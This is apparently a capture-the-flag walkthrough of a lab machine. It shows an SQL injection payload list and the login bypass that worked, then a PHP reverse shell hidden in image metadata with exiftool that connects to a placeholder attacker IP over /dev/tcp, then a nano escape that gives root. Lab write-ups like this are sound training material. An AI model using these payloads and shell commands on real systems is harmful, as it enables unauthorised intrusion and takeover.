```

The moment I went to `/gallery`, I realized it was a login page, I tried some XSS and when I sent the request, this was the output:

![](Pasted image 20241007150803.png)
Seems like this login page is vulnerable to [[SQL INJECTION (SQLI)|SQLI]]
So, let's try to exploit it:

For this, I am using burp's intruder with the following payload list:

```ad-summary
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*â€¦*/ 
+		
||		
%		
@variable

AND 1
AND 0

1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```

Also, as seen in the request, it must be URL encoded, so, I also put this in the payload processing:

Let's launch the attack:
![](Pasted image 20241007152809.png)

![](Pasted image 20241007152818.png)
Seems like the attack worked for that payload, if we decode it, it is this payload:

`' OR 1 -- -`

And we got in as admin:

If we look around, we find an image upload section:

![](Pasted image 20241007153644.png)

We can refer to our [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/FILE UPLOAD|FILE UPLOAD]] note, when we try to upload a file, we can only upload images, `.jpg, .png` so, let's use `exiftool` to embed a reverse shell between an image:

```ad-note
```php-template
exiftool -Comment="<?php echo shell_exec('/bin/bash -c \'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/YOUR_PORT 0>&1\''); ?>" cat.jpg -o shell.php
```

As we can see, file is an jpeg now:

![](Pasted image 20241007160746.png)

Let's try to upload it now:

![](Pasted image 20241007161320.png)
![](Pasted image 20241007161325.png)
![](Pasted image 20241007161334.png)
And we got a shell!

Let's proceed with PRIVILEGE ESCALATION:

First, let's spawn a [[STABLE SHELL|stable shell]], once we've done this, it's time to begin with our privilege escalation:

For the privilege escalation, I used [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), when I looked at linpeas output, I found this:
![](Pasted image 20241007163005.png)
seems like the password for user mike, let's su to mike:

![](Pasted image 20241007163600.png)
Now we are in as mike, let's look at mike's privileges:

![](Pasted image 20241007163724.png)
We found a rootkit.sh script, let's look at it:

![](Pasted image 20241007163807.png)
As shown in the read function of the script, it uses nano, if we go to gtfobins, this is shown:
![](Pasted image 20241007164109.png)

If we execute the script as the root user, this happens:
![](Pasted image 20241007165053.png)

Let's enter the read option:
![](Pasted image 20241007164217.png)
Next, enter `ctrl+r` and `ctrl+x`, then the following command:

`reset; sh 1>&0 2>&0`

![](Pasted image 20241007165137.png)

And just like that, we got root access!
